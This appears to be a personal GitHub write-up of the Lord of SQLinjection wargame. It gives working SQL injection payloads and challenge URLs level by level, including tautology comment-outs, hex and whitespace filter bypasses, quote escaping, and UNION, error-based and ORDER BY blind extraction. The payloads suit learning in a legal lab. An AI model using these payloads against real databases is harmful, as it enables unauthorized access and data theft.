# Lord of SQLinjection

**Id = krxlol**  
**Pw = 123456789**

---

## 1. Gremlin

The task was to make the quesry true  

give a true condition and comment out the rest  

**query :**
```
select id from prob_gremlin where id='hello'OR 1=1--' and pw='00'
```



---

## 2. Cobolt

id was given as admin  

since password was unknow we comment out the rest  

**query :**
```
select id from prob_cobolt where id='admin'-- -' and pw=md5('')
```

---

## 3. Goblin

since quotes canot be used it was found that hex can be kept since it is interpreted as 'admin'

**query :**
```
select id from prob_goblin where id='guest' and no=0 or id=0x61646d696e
```


---

## 4. Orc

find the length of the password using  

**query :**
```
select id from prob_orc where id='admin' and pw='' or id="admin"and length(pw)=8-- -'
```

**query :**
```
select id from prob_orc where id='admin' and pw='095a9852'
```

<img width="1032" height="285" alt="image" src="https://github.com/user-attachments/assets/da672563-2c60-49eb-aea3-3620d55667eb" />


---

## 5. Wolfman

It forbade whitespace, so we used url encoded tab (%09)

```
https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=%27%09or%09id%09=%27admin%27--%09-
```
[Visit the page](https://los.rubiya.kr/chall/wolfman_4fdc56b75971e41981e3d1e2fbe9b7f7.php?pw=%27%09or%09id%09=%27admin%27--%09-)

**query :**
```
select id from prob_wolfman where id='guest' and pw='' or id ='admin'-- -'
```
<img width="940" height="329" alt="image" src="https://github.com/user-attachments/assets/b4937343-361a-4b30-806d-cbb2d5b728ad" />

---

## 6. Darkelf

And = &&  
Or = ||  
Not = !

**query :**
```
select id from prob_darkelf where id='guest' and pw=''||id='admin' -- -'
```

(PICTURE)

---

## 7. Orge

The && symbol doesn't work in a Uniform Resource Locator (URL) since it is a reserve character (%26)
<img width="940" height="329" alt="image" src="https://github.com/user-attachments/assets/5f21f7e0-1333-4c51-bdb5-ffa627b3efba" />

**query :**
```
select id from prob_orge where id='guest' and pw='7b751aec'
```


---

## 8. Troll

Sql is not case senstitive  

**query :**
```
select id from prob_troll where id='Admin'
```



---

## 9. Vampire

This level replaces admin with “”  
we hide admin wich is separated by an admin in between them  

```
aadmindmin
```

```url
https://los.rubiya.kr/chall/vampire_e3f1ef853da067db37f342f3a1881156.php?id=adadminmin
```

**query :**
```
select id from prob_vampire where id='admin'
```


---

## 10. Skelton

**query :**
```
select id from prob_skeleton where id='guest' and pw='' || id='admin'-- -' and 1=0
```

nothing much



---

## 11. Golem

Since “=” was blocked we have to use “LIKE”
<img width="940" height="813" alt="image" src="https://github.com/user-attachments/assets/709a52ca-1f68-4c53-ba29-09b9a714185c" />


**query :**
```
select id from prob_golem where id='guest' and pw='' || id LIKE 'admin' && length(pw) LIKE 8-- -'
```

length is 8  

**query :**
```
select id from prob_golem where id='guest' and pw='' || id LIKE 'admin' && substring(pw, 1, 1) LIKE '1' -- -'
```


---

## 12. Darknight

It prohibits the usage of “ ‘ ” we bypass it by using the hex of admin (0x61646d696e )

**query :**
```
select id from prob_darkknight where id='guest' and pw='' and no=1|| id LIKE 0x61646d696e
```

**query :**
```
select id from prob_darkknight where id='guest' and pw='' and no=0 OR id LIKE 0x61646d696e AND length(pw) LIKE 8
```

pw len is 8 (as usual)

substr is blocked so mid is used
<img width="940" height="358" alt="image" src="https://github.com/user-attachments/assets/d6345742-a284-4887-9ab2-9b30889a3792" />


**query :**
```
select id from prob_darkknight where id='guest' and pw='0b70ea1f' and no=
```


---

## 13. BugBear

<img width="940" height="289" alt="image" src="https://github.com/user-attachments/assets/7c43a3b6-f12b-4d42-a77d-28cb008ebb16" />


Since space is blocked we use tab(%09)

```
https://los.rubiya.kr/chall/bugbear_19ebf8c8106a5323825b5dfa1b07ac1f.php?no=0||id%09IN(%22admin%22)%26%26mid(pw,4,1)IN(%22c%22)
```

**query :**
```
select id from prob_bugbear where id='guest' and pw='' and no=0||id IN("admin")&&mid(pw,4,1)IN("c")
```

password: **52dc3991**



---

## 14. Giant

Since Space and Tab was prohibited we try other possibility  

Vertical tab (%0B) worked

```
https://los.rubiya.kr/chall/giant_18a08c3be1d1753de0cb157703f75a5e.php?shit=%0B
```



---

## 15. Assasin

<img width="940" height="835" alt="image" src="https://github.com/user-attachments/assets/995eada1-f952-45f8-a41a-b174643ac9e3" />

The database table contains rows of users (e.g., guest at row 1, admin at row 2, etc.)

When using tools or writing queries to find the admin, it's essentially asking the database to perform an ordered search (like ORDER BY id)

Because "Hello guest" appears, the query successfully retrieved the guest row, confirming that the guest user row exists at a lower index

In SQL, the percent sign (%) is the wildcard character used to represent zero, one, or multiple characters in a string search

LIKE wildcard allows prefix matching, enabling partial password guessing

90 is common for guest and admin , 902 is unique for admin \

```url
https://los.rubiya.kr/chall/assassin_14a1fd552c61c60f034879e5d4171373.php?pw=902%
```

**query :**
```sql
select id from prob_assassin where pw like '902%'
```



---

## 16. Scubbus

“\” escapes the following character which was the closing single quote.

The \' effectively turns the closing quote into a literal character rather than a string terminator.

The entire middle section—' AND pw='—becomes the content of the id field.

The SQL engine keeps looking for the next unescaped single quote to end the string.

**query :**
```
select id from prob_succubus where id='0&?id=\' and pw=' OR 1=1 -- -'
```


---

## 17. Zombie_assassin

```
?id="&pw=- -- 1=1 RO
```

Trial and error

**query :**
```
select id from prob_zombie_assassin where id='"\' and pw='or 1=1 -- -'\ '
```


---

## 19. XAVIS

**query :**
```
select id from prob_xavis where id='admin' and pw=''||id='admin' and length(pw) =12-- -'
```

length of password is 12  

fetches the admin password  
stores it in a SQL variable  
using union we print it out  

```
?pw=' or (SELECT @ad:=pw WHERE id='admin') UNION SELECT @ad -- -
```

```
우왕굳
```


---

## 20. Dragon

It shows # which is used to comment out the line so we start a new line  

%0A is for New Line / Line Break (\n)

**query :**
```
select id from prob_dragon where id='guest'# and pw='' AND pw='1110' OR id='admin'-- -'
```


---

## 21. Iron_golem

Since sleep and benchmark are filtered, this is an Error-Based SQL Injection challenge.

```
The UNION operator is used to combine the result-set of two or more SELECT statements.
The UNION operator automatically removes duplicate rows from the result set.
Requirements for UNION:
•	Every SELECT statement within UNION must have the same number of columns
•	The columns must also have similar data types
•	The columns in every SELECT statement must also be in the same order
UNION Syntax
SELECT column_name(s) FROM table1
UNION
SELECT column_name(s) FROM table2;

```

**query :**
```
select id from prob_iron_golem where id='admin' and pw='' OR IF(length(pw)>32, (select 1 union select 2), 1) -- -'
```

It intentionally creates a multi-row response  

**query :**
```
select id from prob_iron_golem where id='admin' and pw=' OR IF(substr(pw,1,1)=9, (select 1 union select 2), 1) -- -'
```

<img width="940" height="267" alt="image" src="https://github.com/user-attachments/assets/611c2793-e0e9-4da8-bc00-9ed32b60e7ff" />


---

## 22. Dark_eyes

Since the page exits when the error message comes we can exploit that  

Instead of using if we use where  

**query :**
```
select id from prob_dark_eyes where id='admin' and pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND length(pw)=8) -- -'
```

**query :**
```
select id from prob_dark_eyes where id='admin' and pw='' OR (SELECT 1 UNION SELECT 2 WHERE id='admin' AND substr(pw,1,1)=0) -- -'
```
<img width="940" height="208" alt="image" src="https://github.com/user-attachments/assets/41ae7c6e-a6ef-430e-86e7-07b07a5c8faa" />

---

## 23. Hell_fire

The ORDER BY keyword sorts the records in ascending order by default. To sort the records in descending order, use the DESC keyword.

<img width="531" height="161" alt="image" src="https://github.com/user-attachments/assets/54ce9e7f-b39f-40db-908f-c23f74f54dbe" />


**query :**
```
select id,email,score from prob_hell_fire where 1 order by if(id='admin' AND length(email)=39, 1, 2)
```

```
https://los.rubiya.kr/chall/hell_fire_309d5f471fbdd4722d221835380bb805.php?email=admin%5Fsecure%5Femail@emai1.com
```
Checks if the id is 'admin' AND the length of their email equals to value 'a'
If true, it orders by column 1; if false, it orders by column 2
We can see a change in the sorting of results, confirming the length/brute force 
```?email=admin%5Fsecure%5Femail@emai1.com```

---

## 24. Evil_wizard 

**query :**
```
?order=CASE WHEN (id='admin' AND length(email)=1) THEN 1 ELSE 2 END 
```
```   
?order=CASE WHEN (id='admin' AND substring(email,1,1)="1") THEN 1 ELSE 2 END
```

***
